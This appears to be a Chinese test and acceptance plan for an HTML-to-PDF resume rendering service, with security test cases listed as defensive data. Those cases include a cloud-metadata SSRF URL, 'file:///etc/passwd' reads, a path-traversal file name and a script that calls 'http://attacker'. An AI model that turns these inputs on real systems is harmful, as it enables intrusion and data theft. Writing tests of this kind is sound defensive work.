# 测试与验收标准

## 1. 测试分层

| 层 | 范围 | 运行环境 | 工具 | 目标 |
| --- | --- | --- | --- | --- |
| 单元测试 | 参数解析与校验、错误码映射、文件名净化、限流器、页面尺寸换算、配置校验、存储 TTL 判定 | 本地 `.venv`（无需浏览器） | pytest、pytest-asyncio | 秒级反馈，覆盖全部分支逻辑 |
| 集成测试 | 通过 ASGI 传输层调用真实应用，渲染真实 PDF | 容器（需 Chromium） | pytest、httpx（ASGI transport）、pypdf | 端到端契约与 PDF 正确性 |
| 冒烟测试 | 构建镜像 → 启动容器 → 真实 HTTP 请求 → 下载校验 | 容器 | 脚本 + curl | 每次发布前的最终确认 |
| 性能与并发 | 吞吐、时延分位、限流与队列行为、超时不残留 | 容器 | 自研压测脚本 | 验证容量模型与资源边界 |
| 安全测试 | SSRF、本地文件读取、JS 执行、体积与页数攻击面 | 容器 | pytest | 验证隔离策略真的生效 |
| 保真测试 | 黄金 HTML 集合的版面一致性 | 容器 + 浏览器 | Chromium 截图与 PDF 首页像素比对 | 验证「高保真」这一核心承诺 |

## 2. 黄金样例集合（`tests/fixtures/html/`）

每个样例都必须能体现一条明确的保真要求，且**渲染前后 HTML 字节完全一致**：

| 样例 | 覆盖点 |
| --- | --- |
| `minimal.html` | 最小文档，验证基础链路 |
| `resume-flex.html` | 双列 Flex 布局（左栏联系方式、右栏经历），验证 Flex 保真 |
| `resume-grid.html` | CSS Grid 网格布局，验证现代布局支持 |
| `resume-cjk.html` | 中文字体、行高、字距与标点挤压 |
| `resume-multipage.html` | 跨页分页、`page-break-inside: avoid`、页眉页脚（`@page` margin box） |
| `resume-table.html` | 复杂表格与边框合并 |
| `resume-background.html` | 背景色与渐变（验证 `print_background`） |
| `resume-atpage.html` | 自带 `@page` 尺寸与边距（验证优先级规则） |
| `resume-inline-image.html` | `data:` URI 内联图片（验证资源内联路径可用） |
| `resume-remote-assets.html` | 外链字体/图片（验证零网络策略：资源不加载但渲染不失败） |
| `adversarial-huge.html` | 超长内容（验证页数与体积闸门） |
| `adversarial-ssrf.html` | 内网地址与 `file://` 引用（验证阻断） |

## 3. 「零改写」验证方法

这是 R2 的硬性证据，采用三重手段：

1. **静态审查**：`RenderEngine` 端口与 `RenderOptions` 中不存在任何可写入 HTML 的参数；代码检索断言不存在 `addStyleTag`、`addScriptTag`、`evaluate` 形式的 DOM 变更、以及任何字符串改写 HTML 的分支。
2. **字节一致性断言**：渲染前计算 `sha256(html)` 并写入测试夹具的期望值；渲染接口返回的 `html_sha256_12` 必须与提交值一致（证明服务端没有把改写后的内容送进渲染器）。
3. **DOM 快照比对**：在容器内用 Playwright 打开同一 HTML 并 dump `document.documentElement.outerHTML`，与输入 HTML 的结构归一化后比对，确认文档主体未被注入节点（`@page` 等印刷属性不属于 DOM，不受影响）。

## 4. 用例清单（节选，实施期会补齐编号）

### 4.1 接口与契约

| 编号 | 用例 | 期望 |
| --- | --- | --- |
| API-01 | `POST /v1/render` 最小请求 | 200，返回 `file_url` 可下载且为合法 PDF |
| API-02 | 缺 `html` 字段 | 400 `INVALID_ARGUMENT`，`details` 指向 `html` |
| API-03 | `html` 为空白字符串 | 400 `INVALID_ARGUMENT` |
| API-04 | 非法 JSON 体 | 400 `INVALID_JSON`，不泄漏解析栈 |
| API-05 | `Content-Type: text/plain` | 415 `UNSUPPORTED_MEDIA_TYPE` |
| API-06 | `page.size` 为 `A0` | 400 `INVALID_ARGUMENT` |
| API-07 | `page.margin` 超过 50mm | 400 `INVALID_ARGUMENT` |
| API-08 | `timeout_ms=999` 与 `=60000` | 400 `INVALID_ARGUMENT`（越界） |
| API-09 | `Accept: application/pdf` | 200，`application/pdf`，`Content-Disposition` 含 RFC 5987 编码文件名 |
| API-10 | `file_name` 为 `../../etc/passwd` | 文件名被净化，无路径穿越 |
| API-11 | 中文 `file_name` | `filename*=UTF-8''...` 正确编码，且 `\r\n` 被剔除 |
| API-12 | 表单提交（两种 Content-Type） | 与 JSON 等价 |
| API-13 | 未带 API Key（鉴权开启） | 401 `UNAUTHORIZED` |
| API-14 | 超过 QPS 配额 | 429 `RATE_LIMITED` 且带 `Retry-After` |
| API-15 | 旧 `POST /render` | 200，旧字段齐全且新增字段存在，响应头含 `Deprecation` |
| API-16 | 旧接口错误分支 | 响应在原结构上含 `code` 与 `request_id` |

### 4.2 渲染正确性

| 编号 | 用例 | 期望 |
| --- | --- | --- |
| REN-01 | 12 个黄金样例逐个渲染 | 全部 200，PDF 头为 `%PDF-`，页数 ≥ 1，无空白页 |
| REN-02 | 中文样例 | `pdffonts` 显示嵌入 CJK 子集字体，文字可提取 |
| REN-03 | `resume-atpage.html` 不传页面参数 | 尺寸等于 HTML `@page` 声明 |
| REN-04 | 同文件传 `page.size=Letter` | 尺寸为 Letter，HTML 未被改动 |
| REN-05 | `page.media=screen` 与 `print` | 分别命中 `@media screen` 与 `@media print` 分支 |
| REN-06 | `print_background=false` | 背景色缺失（与 `true` 输出存在可测量差异） |
| REN-07 | `resume-multipage.html` 页数 | 与浏览器打印预览页数一致 |
| REN-08 | `resume-remote-assets.html` | 渲染成功且外链资源未加载（日志中路由阻断计数大于 0） |

### 4.3 资源与隔离

| 编号 | 用例 | 期望 |
| --- | --- | --- |
| RES-01 | 排队等待加渲染时间超过 `timeout_ms` | 504 `RENDER_TIMEOUT`，无残留进程与临时文件 |
| RES-02 | 并发 20 请求（配额内） | 无 5xx；`rpr_render_inflight` 峰值不超过闸门值 |
| RES-03 | 队列饱和 | 快速失败返回 429 或 503，且带 `Retry-After` |
| RES-04 | `adversarial-huge.html` 超过页数上限（默认 5 页） | 422 `PDF_TOO_MANY_PAGES` |
| RES-05 | 内容超 `MAX_PDF_BYTES` | 422 `RENDER_OUTPUT_TOO_LARGE` |
| RES-06 | 渲染后检查临时目录 | 目录为空 |
| RES-07 | 连续渲染 300 次 | 浏览器按 `BROWSER_RECYCLE_AFTER` 回收；容器 PID 数不增长 |
| RES-08 | 渲染过程中 `SIGKILL` 引擎 | 触发重建，服务自动恢复，`/readyz` 回落再恢复 |

### 4.4 安全

| 编号 | 用例 | 期望 |
| --- | --- | --- |
| SEC-01 | HTML 引用 `http://169.254.169.254/latest/meta-data/` | 请求被阻断，渲染仍成功，无外联流量 |
| SEC-02 | HTML 引用 `file:///etc/passwd` | 被阻断，渲染成功 |
| SEC-03 | HTML 内 `<script>fetch('http://attacker')</script>` | 脚本不执行（无请求、无副作用） |
| SEC-04 | HTML 内 `<script>document.body.innerHTML='HACKED'</script>` | PDF 内容与原始 HTML 一致，未被改写 |
| SEC-05 | 请求体超过 `MAX_REQUEST_BYTES` | 413 `PAYLOAD_TOO_LARGE`，且未进入渲染 |
| SEC-06 | 未授权访问 `/v1/files/{id}` | 401；伪造签名被拒 |
| SEC-07 | 任意错误触发 | 响应体不含堆栈、路径、库版本 |

### 4.5 可观测性

| 编号 | 用例 | 期望 |
| --- | --- | --- |
| OBS-01 | `/healthz`、`/readyz`、`/metrics` | 结构符合契约；`/metrics` 含全部已定义指标名 |
| OBS-02 | 单次渲染 | 日志含 `request_id`、`duration_ms`、`page_count`、`html_sha256_12`，**不含 HTML 正文** |
| OBS-03 | 主动传 `X-Request-Id` | 响应与日志一致；非法值被忽略并回落到服务端生成 |
| OBS-04 | 指标自增 | 成功与失败分别落在正确的 `result`/`error_code` 标签 |

### 4.6 平台接入（星辰）

| 编号 | 用例 | 期望 |
| --- | --- | --- |
| PLT-01 | `GET /v1/openapi.agent.yaml` | 只含 `POST /v1/render` 与 `GET /v1/files/{file_id}` 两个操作 |
| PLT-02 | 注入 `PUBLIC_BASE_URL=https://pdf.example.com` 后取 Schema | `servers[0].url` 等于该值；未配置时回退按请求 `Host` 推导 |
| PLT-03 | 用第三方 OpenAPI 校验器解析精简契约 | 零错误；不存在 `oneOf`、`anyOf` 与跨文件 `$ref` |
| PLT-04 | 精简契约与完整契约的一致性 | 精简契约由脚本从完整契约生成，生成结果与仓库内文件一致（漂移即 CI 失败） |
| PLT-05 | 平台典型调用形态（只传 `html` 与 `file_name`） | 200，返回可直接下载的 `file_url` |

## 5. 保真度评估方法

1. **结构一致性**：对每个黄金样例，用 Chromium 以 A4 打印参数截图（`page.screenshot` 逐页或 `pdf` 转图），与服务端输出的 PDF 逐页栅格化（`pdftoppm -r 96`），计算 SSIM。判定阈值：单页 SSIM ≥ 0.97 视为通过；0.90–0.97 需人工确认；低于 0.90 视为不通过。
2. **文本一致性**：`pdftotext` 提取文本与 HTML 文本节点归一化后比对，字符缺失率必须为 0（证明没有丢字、没有被我们改写）。
3. **人工抽检**：至少对 4 个真实简历 HTML（由你提供或我从黄金集合中挑选）做人工目检，确认无错位、无裁切、无字体回退异常。

## 6. CI 门禁（GitHub Actions）

| 阶段 | 内容 | 失败即阻断 |
| --- | --- | --- |
| 静态检查 | `ruff check`、`ruff format --check`、`mypy`、`python scripts/validate_openapi.py` | 是 |
| 单元测试 | `pytest tests/unit`（无需浏览器） | 是 |
| 集成与安全测试 | 在容器内 `pytest tests/integration tests/security` | 是 |
| 镜像构建与冒烟 | `docker build` + 启动 + `scripts/smoke.*` 真实请求 | 是 |

## 7. 验收标准（逐条可判定）

**功能验收**

1. 12 个黄金样例全部渲染成功，PDF 非空白，页数与浏览器打印预览一致。
2. 页面尺寸、边距、媒体类型、背景打印、超时、响应形态、文件名等参数全部生效，越界均被拒绝。
3. `POST /v1/render` 与旧 `POST /render` 均可用，旧接口字段向后兼容。
4. 错误码覆盖 `03-api-contract.md` 定义的全部错误码，且无一泄漏内部细节。

**非功能验收**

5. 时延：单页简历（约 30KB HTML）在 4 vCPU/4GB、并发 4 下 P95 < 3s，P99 < 5s。
6. 稳定性：20 并发持续 5 分钟，无 5xx（配额内）、无 OOM、容器 PID 数与内存无单调增长。
7. 隔离：SSRF、本地文件、脚本执行三类用例全部被阻断。
8. 清理：请求结束临时目录为空；超过 TTL 的产物被删除，`rpr_artifacts_deleted_total` 递增。
9. 可观测：`/healthz`、`/readyz`、`/metrics` 可用，指标与日志字段齐全，日志无 HTML 正文。
10. 质量：ruff、mypy 零告警；单元 + 集成 + 安全测试全绿并附执行输出。

**文档验收**

11. 本套文档（需求、架构、契约、OpenAPI、部署、测试、任务计划）与代码行为一致；OpenAPI 通过 `scripts/validate_openapi.py` 校验。

## 8. 最终交付物清单

| 交付物 | 位置 |
| --- | --- |
| 源码 | `src/resume_pdf/`、`tests/`、`scripts/`、`deploy/`、`Dockerfile`、`pyproject.toml`、`uv.lock` |
| 开发文档 | `docs/00`–`docs/07` |
| OpenAPI 3.0.3 Schema | `docs/04-openapi.yaml`（并由 `/v1/openapi.yaml` 对外提供） |
| 测试结果 | CI 运行记录 + `docs/08-test-report.md`（实施期生成，含真实命令输出与截图证据） |
| 验收说明 | `docs/09-acceptance-report.md`（实施期生成，逐条对应第 7 节标准） |
